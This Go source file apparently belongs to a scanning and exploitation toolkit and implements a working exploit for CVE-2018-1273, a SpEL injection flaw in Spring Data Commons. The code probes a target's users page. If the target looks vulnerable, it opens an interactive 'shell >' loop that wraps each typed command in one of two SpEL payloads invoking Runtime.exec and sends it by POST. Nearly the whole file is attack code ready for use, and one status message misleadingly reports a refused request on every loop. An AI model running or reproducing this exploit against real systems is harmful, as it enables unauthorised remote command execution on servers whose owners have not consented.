package exppackage

import (
	"bufio"
	"fmt"
	"github.com/fatih/color"
	"io/ioutil"
	"net/http"
	"os"
	"ssp/common"
	"strings"
)

func CVE_2018_1273(url string) {

	oldHeaders := map[string]string{
		"User-Agent":   common.GetRandomUserAgent(),
		"Content-Type": "application/x-www-form-urlencoded",
	}

	headers := common.MergeHeaders(oldHeaders)

	path1 := "users"
	path2 := "users?page=0&size=5"

	payload1 := "username[#this.getClass().forName(\"java.lang.Runtime\").getRuntime().exec(\"%s\")]=chybeta&password=chybeta&repeatedPassword=chybeta"
	payload2 := "username[#this.getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"js\").eval(\"java.lang.Runtime.getRuntime().exec('%s')\")]=asdf"

	client := &http.Client{}

	urlTest1 := url + path1
	urlTest2 := url + path2

	req1, err := http.NewRequest("GET", urlTest1, nil)
	if err != nil {
		fmt.Println("[-] 发生错误:", err)
		return
	}
	for key, value := range headers {
		req1.Header.Set(key, value)
	}
	re1, err := client.Do(req1)
	if err != nil {
		fmt.Println("[-] 发生错误:", err)
		return
	}
	defer re1.Body.Close()

	body, err := ioutil.ReadAll(re1.Body)
	if err != nil {
		fmt.Println("[-] 发生错误:", err)
		return
	}

	code1 := re1.StatusCode
	if code1 == 200 && strings.Contains(string(body), "Users") {
		common.PrintVulnerabilityConfirmation("CVE-2018-1273", url, "存在漏洞,由于该漏洞无回显，请用Dnslog进行测试", "1")
		fmt.Print("[+] 两种Payload，请输入1或者2: ")

		var choose string
		fmt.Scanln(&choose)

		for {
			fmt.Print("shell > ")
			reader := bufio.NewReader(os.Stdin)
			command, _ := reader.ReadString('\n')
			command = strings.TrimSpace(command)

			if command == "exit" {
				os.Exit(0)
			}

			payload := ""
			if choose == "1" {
				payload = fmt.Sprintf(payload1, command)
			} else {
				payload = fmt.Sprintf(payload2, command)
			}

			req2, err := http.NewRequest("POST", urlTest2, strings.NewReader(payload))
			if err != nil {
				fmt.Println("[-] 发生错误:", err)
				return
			}
			for key, value := range headers {
				req2.Header.Set(key, value)
			}
			color.Yellow("[-] URL为：%s，的目标积极拒绝请求，予以跳过\n", url)

			re2, err := client.Do(req2)
			if err != nil {
				fmt.Println("[-] 发生错误:", err)
				return
			}
			defer re2.Body.Close()

		}
	} else {
		color.Yellow("[-] %s 未发现CVE-2018-1273远程命令执行漏洞\n", url)
	}

}
